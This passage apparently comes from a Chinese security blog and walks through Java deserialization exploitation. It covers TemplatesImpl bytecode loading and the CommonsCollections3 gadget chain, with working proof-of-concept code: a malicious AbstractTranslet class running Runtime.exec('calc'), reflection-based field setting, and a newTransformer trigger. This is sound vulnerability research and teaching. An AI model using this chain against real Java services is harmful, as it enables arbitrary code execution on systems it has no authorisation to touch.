<p>首先一个是对<code>_bytecodes</code>判断是否为空，这里的<code>_bytecodes</code>其实就是我们的字节码数组，那么我们这里把我们的字节码赋值给<code>_bytecodes</code>就可以使其不为空</p>
<p>我们这里还是通过反射去修改属性值：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field filed = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">filed.set(templates, &quot;字节码&quot;);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

<p>或者是直接加载远程或者本地class文件：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\CC\\target\\classes\\EvilTemplatesImpl.class&quot;));</span><br><span class="line">       byte[][] codes = &#123;code&#125;;</span><br><span class="line">       setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span><br></pre></td></tr></table></figure></div>



<p>其实效果都是一样的。</p>
<p>然后是一个run方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

<p>这里有一个<code>_tfactory</code>，因为用到了这个参数所以我们要给这个参数赋值，不然这里就会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802171846688.png"
                      alt="image-20230802171846688"
                ></p>
<p><code>transient</code> 关键字是 Java 中的一个修饰符，用于标记变量，表示该变量在对象的序列化过程中不会被持久化，即不会被写入到字节流中，从而在反序列化后该变量的值会被重新初始化。</p>
<p>所以说我们这里给这个参数去赋值时没有意义的，因为当他在被反序列化的时候又被重新初始化了。<br>那我们直接跟进到readobject中去看一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802172251738.png"
                      alt="image-20230802172251738"
                ></p>
<p>可以看到在反序列化的时候是会给这个参数赋值的</p>
<p>但是我们这里要使用这个参数</p>
<p>所以我们这里可以通过反射随便给它赋值，因为无论我们赋什么值，这里在反序列化的时候的值是不会改变的</p>
<p>然后我们这里为了方便直接赋值<code>new TransformerFactoryImpl</code>，方便我们后面调试，因为我们利用链到这里还不会进行反序列化，所以我们这里先赋值给它。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field filed = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">filed.set(templates, &quot;new TransformerFactoryImpl&quot;);</span><br></pre></td></tr></table></figure></div>

<p>然后我们这里为了简化代码，直接把反射修改属性值这一部分代码定义一个函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">    Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    filed.setAccessible(true);</span><br><span class="line">    filed.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么到这里我们的POC可以编写为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class cc3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;字节码base64编码&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么正常情况下，我们这里应该已经可以正常进行命令执行</p>
<p>那么我们这里编写一个命令执行的恶意代码类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后编译一下把字节码base64编码一下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class bianma &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String filePath = &quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class\\&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] classBytes = readClassFile(filePath);</span><br><span class="line">            String base64Encoded = convertToBase64(classBytes);</span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static byte[] readClassFile(String filePath) throws IOException &#123;</span><br><span class="line">        try (FileInputStream fis = new FileInputStream(filePath);</span><br><span class="line">             ByteArrayOutputStream baos = new ByteArrayOutputStream()) &#123;</span><br><span class="line">            byte[] buffer = new byte[4096];</span><br><span class="line">            int bytesRead;</span><br><span class="line">            while ((bytesRead = fis.read(buffer)) != -1) &#123;</span><br><span class="line">                baos.write(buffer, 0, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            return baos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String convertToBase64(byte[] data) &#123;</span><br><span class="line">        return Base64.getEncoder().encodeToString(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们直接把我们的POC运行一下：</p>
<p>但是并没有执行命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175110466.png"
                      alt="image-20230802175110466"
                ></p>
<p>然后是报了一个空指针错误在defineTranslectClasses里面</p>
<p>但是这个不太好找</p>
<p>然后我们这里打断点跟进调试一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175023651.png"
                      alt="image-20230802175023651"
                ></p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175259884.png"
                      alt="image-20230802175259884"
                ></p>
<p>然后我们可以看到这里类加载是已经成功了</p>
<p>然后我们继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175419393.png"
                      alt="image-20230802175419393"
                ></p>
<p>然后我们可以看到就是在这个if判断里面报了一个空指针错误</p>
<p>然后这个if就是检查我们传入字节码是不是<code>ABSTRACT_TRANSLET</code>的子类</p>
<p>然后是的话会对<code>_transletIndex</code>进行一个赋值，不是的话，就会跳转到我们报空指针错误的地方</p>
<p>那我们这里解决办法有两个：</p>
<p>1、给_auxCLasses赋值，解决这个空指针报错</p>
<p>2、使if判断为真也就是我们传入的字节码为<code>ABSTRACT_TRANSLET</code>的子类</p>
<p>但是我们往下看还有一个if判断：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (_transletIndex &lt; 0) &#123;</span><br><span class="line">             ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">             throw new TransformerConfigurationException(err.toString());</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里也就是<code>_transletIndex</code> 值小于0就直接抛出异常</p>
<p>而且我们现在的<code>_transletIndex</code> 值是-1</p>
<p>所以我们给_auxCLasses赋值不可行，因为这样无法过第二个if，仍然会报错</p>
<p>所以我们这里要使我们传入的字节码为<code>ABSTRACT_TRANSLET</code>的子类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180950718.png"
                      alt="image-20230802180950718"
                ></p>
<p>跟进到这个类里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180931720.png"
                      alt="image-20230802180931720"
                ></p>
<p>可以看到这个类是一个抽象类，那他的子类就要实现它的抽象方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181053462.png"
                      alt="image-20230802181053462"
                ></p>
<p>所以我们构造的恶意类就要实现这个transform抽象方法</p>
<p>那我们这里重新构造一个恶意类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers)</span><br><span class="line">            throws TransletException &#123;&#125;</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator,</span><br><span class="line">                          SerializationHandler handler) throws TransletException &#123;&#125;</span><br><span class="line">    public HelloTemplatesImpl() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们的POC就可以构造为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class blog &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181259643.png"
                      alt="image-20230802181259643"
                ></p>
<p>可以看到已经成功运行了。但是这里我们并没有进行newInstance()，但是依然弹出了计算器，</p>
<p>那我们这里就打断点整体分析一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194144950.png"
                      alt="image-20230731194144950"
                ></p>
<p>可以看到这里是显调用了run方法创建一个<code>TransletClassLoader</code> 对象对象</p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194232897.png"
                      alt="image-20230731194232897"
                ></p>
<p>由于我们这里只传入了一个字节数组，所以这里的_bytecodes.length的值就为1，赋值给classCount</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_class = new Class[classCount];</span><br></pre></td></tr></table></figure></div>

<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194642542.png"
                      alt="image-20230731194642542"
                ></p>
<p>可以看到这里第一轮循环，处理了我们传入的字节数组，然后经过if判断将i的值0赋值给了_transletIndex</p>
<p>然后就步出回到了getTransletInstance()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194955697.png"
                      alt="image-20230731194955697"
                ></p>
<p>可以看到这里调用了_class[0]的newInstance()方法，弹出计算器</p>
<p>所以这就是我们为什么不用再newinstace的原因了。</p>
<p>利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses()-&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div>

<h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>这里等分析完cc3再来学习</p>
<p>这里可以参考P牛的文章：</p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" >https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonCollections3利用链分析</title>
    <url>/2023/08/02/CommonCollections3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="CommonsCollections3利用链分析"><a href="#CommonsCollections3利用链分析" class="headerlink" title="CommonsCollections3利用链分析"></a>CommonsCollections3利用链分析</h1><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面分析的CC1和CC6都是在transform直接执行命令，但是在CC3中是通过动态加载恶意类字节码来进行命令执行的。在上篇文章中对动态类加载机制进行了学习。</p>
<p>这里再对TemplatesImpl类加载字节码实现任意代码执行进行一个回顾。</p>
<h1 id="二、CC3的分析"><a href="#二、CC3的分析" class="headerlink" title="二、CC3的分析"></a>二、CC3的分析</h1><h2 id="TemplatesImpl类加载字节码实现任意代码执行"><a href="#TemplatesImpl类加载字节码实现任意代码执行" class="headerlink" title="TemplatesImpl类加载字节码实现任意代码执行"></a>TemplatesImpl类加载字节码实现任意代码执行</h2><p>在动态加载字节码中我们已经分析了TemplatesImpl是如何动态加载字节码进行任意代码执行的，然后我们这里在回顾一下。</p>
<p>类加载机制是java虚拟机用于在运行时加载java类文件并将其转换为可执行代码的过程。所以不管是加载远程的class文件，还是本地的class或jar文件，JAVA虚拟机都会经历下面三个方法的调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802153633882.png"
                      alt="image-20230802153633882"
                ></p>
<p>这里其实也就是双亲委托机制：</p>
<p>我们在双亲委派中学习了，在加载一个类时首先会先调用<code>findLoadedClass(name)</code>方法检查是否已经加载了对应名称的类，如果未加载会调用父类加载器通过loadclass来加载类直到顶层加载器都不能加载成功，子类加载器会开始搜索类进行加载，这里使用的就是findclass(name)方法来查找加载类（类似我们上面的URLClassLoader），如果子类也不能加载继续调用子类加载器，直到调用到自定义加载器。当加载到类后会调用defineclass方法，并将字节码的字节数组、类名等信息传递给该方法。<code>defineClass</code> 方法会在 JVM 中将这些字节码转换为一个 Java 类的 <code>Class</code> 类，并将其加入到类加载器的类命名空间中。</p>
<p>其实前面两个loadclass和findclass都是在查找加载类，而defineclass才是真正的核心。</p>
<p>也就是说define将加载的字节码转换为一个java类。</p>
<p>我们这里分析一下defineclass的代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Classloader#defineclass</span><br><span class="line"></span><br><span class="line">   protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)</span><br><span class="line">        throws ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        return defineClass(name, b, off, len, null);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>name</code>：表示要定义的类的全限定名，例如：”com.example.MyClass”。</li>
<li><code>b</code>：一个字节数组，其中包含类的字节码数据。</li>
<li><code>off</code>：字节数组的起始偏移量，指示类的字节码在字节数组中的开始位置。</li>
<li><code>len</code>：表示类的字节码长度</li>
</ul>
<p>但是这个方法是一个受保护的方法，所以我们不能够直接从外部调用他。</p>
<p>但是这里我们可以通过反射去获取这个方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class HelloDefineClass &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);//反射获取</span><br><span class="line">        defineClass.setAccessible(true);</span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);//一个输出hello world的字节码文件base64编码</span><br><span class="line">                        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code, 0, code.length);</span><br><span class="line">                        hello.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802155138837.png"
                      alt="image-20230802155138837"
                ></p>
<p>但是有一点要注意，defineclass被调用的时候，类对象并不会被初始化，只有显式调用构造函数，初始化代码才会执行，而且既即使我们这里的代码放到类的静态代码块也无法直接被调用，所以我们如果想要使用defines在目标机器上面浙西任意代码，需要想办法构造调用函数。</p>
<p>上面我们说了defineclass是一个受保护的方法，外部不能够直接利用，而且我们想要构造攻击链，入口点一定要是readobject函数。</p>
<p>所以我们要构造攻击链就要向上找defineclass的调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802155737257.png"
                      alt="image-20230802155737257"
                ></p>
<p>在TemplatesImpl的内部类loadclass中重写了defineclass方法</p>
<p>但是这里并没有显式的声明其定义域。在java中默认情况下，如果一个方法没有显示的声明其作用域，那么默认其作用域为default，那么也就是说defineclass方法由父类的protected变成了default</p>
<p>，那么defineclass就不能包外的类调用，只能被同一包中的其他类调用。</p>
<p>那么我们就只能在TemplatesImpl类中找对defineclass的调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802160416093.png"
                      alt="image-20230802160416093"
                ></p>
<p>在<code>defineTransletClasses</code>方法中调用了<code>defineclass</code>方法，但是这个方法仍是一个私有方法，不能够被类外部调用</p>
<p>继续在<code>TemplatesImpl</code>找对<code>defineTransletClasses</code>的调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802160629448.png"
                      alt="image-20230802160629448"
                ></p>
<p>我们可以在<code>getTransletClasses</code>中找到对<code>defineTransletClasses</code></p>
<p>但是同样的这也是一个私有方法</p>
<p>继续向上找调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802160912540.png"
                      alt="image-20230802160912540"
                ></p>
<p>我们在newTransformer中可以找到对getTransletInstance()</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized Transformer newTransformer()</span><br><span class="line">        throws TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">        if (_uriResolver != null) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(true);</span><br><span class="line">        &#125;</span><br><span class="line">        return transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>并且这个方法还是一个公有方法，那么这个方法是可以被外部调用的</p>
<p>那么到这里我们已经可以构造出我们攻击链的后半部分</p>
<p>利用<code>TemplatesImpl</code>类加载字节码实现任意代码执行</p>
<p>利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">    TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">           TemplatesImpl#defineTransletClasses()-&gt; </span><br><span class="line">                 TransletClassLoader#defineClass()-&gt;加载恶意类字节码</span><br></pre></td></tr></table></figure></div>

<p>我们上边只是简单的分析了一下调用关系，细节地方并没有分析，接下来我们详细分析一下调用关系和条件，编写POC：</p>
<p>首先我们回到<code>newTransform</code>方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802161413895.png"
                      alt="image-20230802161413895"
                ></p>
<p>这里<code>getTransletInstance()</code>是作为实例化<code>TransformerImpl</code>的一个参数传入进去的</p>
<p>那么只要调用了<code>newTransform</code>就一定会触发对<code>getTransletInstance()</code>的调用</p>
<p>我们这里直接跟进到<code>getTransletInstance()</code>方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802161756733.png"
                      alt="image-20230802161756733"
                ></p>
<p>我们在<code>getTransletInstance()</code>里面要调用<code>defineTransletClasses()</code></p>
<p>要满足两个条件</p>
<p><code>_name!=NULL&amp;&amp;_class==NULL</code></p>
<p>我们这里看一下这两个参数的默认值是什么：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802162015149.png"
                      alt="image-20230802162015149"
                ></p>
<p>可以看到这两个参数的值都是空</p>
<p>所以我们要想要触发defineTransletClasses()方法，就要修改_name的值不为空</p>
<p>但是这两个属性都是私有属性，我们不能够直接修改，只能在其构造方法里面修改：</p>
<p>这里看一下TemplatesImpl的构造方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802162259595.png"
                      alt="image-20230802162259595"
                ></p>
<p>是一个公共方法，但是构造方法里面是空的，也就是一个无参构造</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802162815896.png"
                      alt="image-20230802162815896"
                ></p>
<p>而且这个类是继承了序列化接口的，也就是说是可以序列化的，那么我们这里就可以直接去用了。</p>
<p>那我们这里就可以通过反射区修改属性值：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(obj,value);</span><br></pre></td></tr></table></figure></div>

<p>那么我们这里就可以构造出POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class cc3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates=new TemplatesImpl();</span><br><span class="line">        //反射修改属性值</span><br><span class="line">        Field filed = templates.getClass().getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(templates, &quot;11111&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们这里修改后就可以满足调用<code>defineTransletClasses()</code>的条件了</p>
<p>继续跟进到<code>defineTransletClasses()</code>：</p>
<p>我们这里先看一下我们要调用的defineClass()方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">            final int classCount = _bytecodes.length;</span><br><span class="line">            _class = new Class[classCount];</span><br><span class="line"></span><br><span class="line">            if (classCount &gt; 1) &#123;</span><br><span class="line">                _auxClasses = new HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                final Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                // Check if this is the main class</span><br><span class="line">                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们在调用<code>defineclass</code>方法时还传入了一个字节数组<code>_bytecodes[i]</code></p>
<p>那么结合前面这里这个字节数组就是我们要传入的字节码</p>
<p>那么其实这个就是实现了遍历字节数组取出当中的字节码，然后传入defineclass进行处理</p>
<p>但是我们不可能调用<code>defineTransletClasses()</code>就能够直接调用到<code>defineClass</code></p>
<p>我们这里分析一下上面的代码逻辑：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (_bytecodes == null) &#123;</span><br><span class="line">    ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>首先一个是对<code>_bytecodes</code>判断是否为空，这里的<code>_bytecodes</code>其实就是我们的字节码数组，那么我们这里把我们的字节码赋值给<code>_bytecodes</code>就可以使其不为空</p>
<p>我们这里还是通过反射去修改属性值：</p>
